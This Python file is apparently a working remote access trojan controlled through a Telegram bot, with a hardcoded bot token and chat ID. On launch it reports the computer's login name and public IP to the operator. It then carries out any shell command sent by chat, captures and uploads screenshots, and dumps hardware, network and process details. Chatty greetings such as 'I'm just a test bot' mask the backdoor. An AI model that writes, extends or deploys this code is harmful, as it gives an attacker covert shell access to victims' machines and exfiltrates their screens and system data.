import os
import subprocess
import httpx
import logging
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

#imports for info
import platform
import socket
import psutil
import shutil
import screeninfo
#imports for scrcap
from PIL import ImageGrab

############################################################################################################################################################
#########################################capture screen from payload scrcap#################################
def capture_screen():
    # Make sure directory exists
    save_dir = "imgdat"
    os.makedirs(save_dir, exist_ok=True)

    # Get timestamp for filename
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    file_name = f"{timestamp}.png"
    full_path = os.path.join(save_dir, file_name)

    # Capture and save screenshot
    screenshot = ImageGrab.grab()
    screenshot.save(full_path)

    return full_path, file_name
########################################################################################################################################

#########################################get info from payload info#####################################################

def get_os_info():
    return "[+] OS Version: " + platform.system() + " " + platform.release()

def get_cpu_info():
    cpu_info = "\n==== CPU INFO ===="
    cpu_info += f"\n[+] Physical cores: {psutil.cpu_count(logical=False)}"
    cpu_info += f"\n    Logical processors: {psutil.cpu_count(logical=True)}"
    cpu_info += f"\n    CPU Frequency: {psutil.cpu_freq().max} MHz"
    cpu_info += "\n    CPU Usage per core:"
    for i, perc in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        cpu_info += f"\n    - Core {i}: {perc}%"
    return cpu_info

def get_ram_info():
    ram = psutil.virtual_memory()
    ram_info = "\n==== RAM INFO ===="
    ram_info += f"\n[+] Total: {round(ram.total / (1024 ** 2))} MB"
    ram_info += f"\n    Available: {round(ram.available / (1024 ** 2))} MB"
    ram_info += f"\n    Used: {round(ram.used / (1024 ** 2))} MB"
    ram_info += f"\n    Usage %: {ram.percent}"
    return ram_info

def get_disk_info():
    disk_info = "\n==== DISK INFO ===="
    for part in psutil.disk_partitions(all=False):
        try:
            if not os.path.exists(part.mountpoint):
                continue  # Skip if mount point doesn't exist
            usage = psutil.disk_usage(part.mountpoint)
            disk_info += f"\n[+] Device: {part.device}"
            disk_info += f"\n    Mountpoint: {part.mountpoint}"
            disk_info += f"\n    File System: {part.fstype}"
            disk_info += f"\n    Total Size: {round(usage.total / (1024 ** 3))} GB"
            disk_info += f"\n    Used: {round(usage.used / (1024 ** 3))} GB"
            disk_info += f"\n    Free: {round(usage.free / (1024 ** 3))} GB"
            disk_info += f"\n    Usage %: {usage.percent}%"
        except (PermissionError, FileNotFoundError, OSError):
            continue
    return disk_info

def get_network_info():
    network_info = "\n==== NETWORK INFO ===="
    interfaces = psutil.net_if_addrs()
    for iface, addrs in interfaces.items():
        network_info += f"\n[+] Interface: {iface}"
        for addr in addrs:
            if addr.family == socket.AF_INET:
                network_info += f"\n    IPv4 Address: {addr.address}"
            elif hasattr(psutil, "AF_LINK") and addr.family == psutil.AF_LINK:
                network_info += f"\n    MAC Address: {addr.address}"
    try:
        public_ip = requests.get("https://api.ipify.org").text
        network_info += f"\n[+] Public IP: {public_ip}"
    except:
        network_info += "\n[!] Failed to fetch public IP"
    return network_info

def get_system_info():
    system_info = "\n==== SYSTEM INFO ===="
    system_info += f"\n[+] Node: {platform.node()}"
    system_info += f"\n    System: {platform.system()}"
    system_info += f"\n    Machine: {platform.machine()}"
    system_info += f"\n    Processor: {platform.processor()}"
    return system_info

def get_display_info():
    display_info = "\n==== DISPLAY INFO ===="
    try:
        for m in screeninfo.get_monitors():
            display_info += f"\n[+] Monitor: {m.name if hasattr(m, 'name') else 'Unknown'}"
            display_info += f"\n    Width: {m.width}"
            display_info += f"\n    Height: {m.height}"
            display_info += f"\n    Scale: {m.width}x{m.height}"
    except ImportError:
        display_info += "\n[!] screeninfo not installed: pip install screeninfo"
    return display_info

def get_battery_info():
    battery_info = "\n==== BATTERY INFO ===="
    battery = psutil.sensors_battery()
    if battery:
        battery_info += f"\n[+] Battery percent: {battery.percent} %"
        battery_info += f"\n    Plugged in: {'Yes' if battery.power_plugged else 'No'}"
        battery_info += f"\n    Time left (minutes): {battery.secsleft // 60 if battery.secsleft != psutil.POWER_TIME_UNLIMITED else 'Unlimited'}"
    else:
        battery_info += "\n[!] No battery info available"
    return battery_info

def get_temperature_info():
    temperature_info = "\n==== TEMPERATURE INFO ===="
    if not hasattr(psutil, "sensors_temperatures"):
        temperature_info += "\n[!] Temperature monitoring not supported on this system."
        return temperature_info

    sensors = psutil.sensors_temperatures()
    if sensors:
        for name, entries in sensors.items():
            for entry in entries:
                temperature_info += f"\n[+] {name} - {entry.label}: {entry.current}°C"
    else:
        temperature_info += "\n[!] No temperature info available"
    return temperature_info


def get_system_uptime():
    uptime_seconds = psutil.boot_time()
    uptime = uptime_seconds
    days = uptime // (24 * 3600)
    uptime = uptime % (24 * 3600)
    hours = uptime // 3600
    uptime %= 3600
    minutes = uptime // 60
    uptime_info = "\n==== SYSTEM UPTIME ===="
    uptime_info += f"\n[+] System uptime: {days} days, {hours} hours, {minutes} minutes"
    return uptime_info

def get_process_info():
    process_info = "\n==== PROCESS INFO ===="
    processes = psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])
    for proc in processes:
        process_info += f"\n[+] PID: {proc.info['pid']} - Name: {proc.info['name']} - CPU: {proc.info['cpu_percent']}% - Memory: {proc.info['memory_percent']}%"
    return process_info

# Final function to combine all system information into a single variable
def get_all_system_info():
    all_info = ""
    all_info += get_os_info() + "\n"
    all_info += get_system_info() + "\n"
    all_info += get_cpu_info() + "\n"
    all_info += get_ram_info() + "\n"
    all_info += get_disk_info() + "\n"
    all_info += get_network_info() + "\n"
    all_info += get_display_info() + "\n"
    all_info += get_battery_info() + "\n"
    all_info += get_temperature_info() + "\n"
    all_info += get_system_uptime() + "\n"
    all_info += get_process_info() + "\n"
    
    return all_info

# Store the combined information into a variable

###############################################################################################################################
BOT_TOKEN = "7727386095:AAGVE3OsgVvAEEeZlFe6j5VK9ej4YMd9qm8"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global current working directory
cwd = os.getcwd()

# Helper: Send large message in chunks
async def send_large_message(update, message):
    max_length = 4096
    for i in range(0, len(message), max_length):
        await update.message.reply_text(message[i:i + max_length])

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/start used by {update.effective_user.username}")
    await update.message.reply_text("Hello! I'm your bot. Type /help to see what I can do.")

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/help used by {update.effective_user.username}")
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Welcome message\n"
        "/help - Show this help\n"
        "cmd <command> - Run system command\n"
        "scrcap - Capture screen\n"
        "info - Get system info\n"
    )

# Message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cwd
    msg = update.message.text.strip()
    user = update.effective_user.username or update.effective_user.first_name
    logger.info(f"Received from {user}: {msg}")

    try:
        if msg.lower() == "hi":
            await update.message.reply_text("Hello there, friend!")
        elif msg.lower() == "bye":
            await update.message.reply_text("Goodbye or see ya 👋")
        elif msg.lower() == "use":
            await update.message.reply_text("I'm just a test bot 🤖")
        elif msg.lower() == "info":
            logger.info(f"{user} requested system info")
            info = get_all_system_info()
            await send_large_message(update, info)
        elif msg.lower() == "scrcap":
            logger.info(f"{user} requested screenshot")
            try:
                path, name = capture_screen()
                await update.message.reply_text("Here is your screen capture 👇")
                with open(path, "rb") as f:
                    await update.message.reply_photo(f)
            except Exception as e:
                logger.error(f"Screenshot error: {e}")
                await update.message.reply_text(f"[!] Screenshot failed: {e}")
        elif msg.lower().startswith("cmd "):
            cmd = msg[4:].strip()
            logger.info(f"{user} command: {cmd}")
            if cmd.lower().startswith("cd "):
                path = cmd[3:].strip().strip('"')
                new_path = os.path.abspath(os.path.join(cwd, path))
                if os.path.isdir(new_path):
                    cwd = new_path
                    await update.message.reply_text(f"Changed directory to: {cwd}")
                else:
                    await update.message.reply_text(f"[-] Directory not found: {path}")
            else:
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout.strip() or "[+] Done with no output."
                    error = result.stderr.strip()
                    final = output + ("\n[!] " + error if error else "")
                    await send_large_message(update, final)
                except Exception as e:
                    logger.error(f"Command error: {e}")
                    await update.message.reply_text(f"[!] Error: {e}")
        else:
            await update.message.reply_text("I don't understand that. Try /help")
    except Exception as e:
        logger.exception("Unexpected error")
        await update.message.reply_text(f"[!] Something went wrong: {e}")

# Bot startup function
def main():
    logger.info("Starting bot...")

    # ⬇ Send PC info on startup using requests (replaces old async job)
    try:
        pc_username = os.getlogin()
        public_ip = requests.get("https://api.ipify.org?format=json").json().get("ip", "No IP")
        current_date = datetime.now().strftime("%b %d, %Y %I:%M:%S %p")
        TEXT = f"{pc_username} {public_ip} {current_date}"

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": "5441972884",
            "text": TEXT
        }
        r = requests.post(url, data=payload)
        print(f"Startup message sent: {r.json()}")
    except Exception as e:
        print(f"[!] Failed to send startup message: {e}")

    # Start bot app
    app = Application.builder().token(BOT_TOKEN).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot is now polling")
    app.run_polling()

if __name__ == "__main__":
    main()
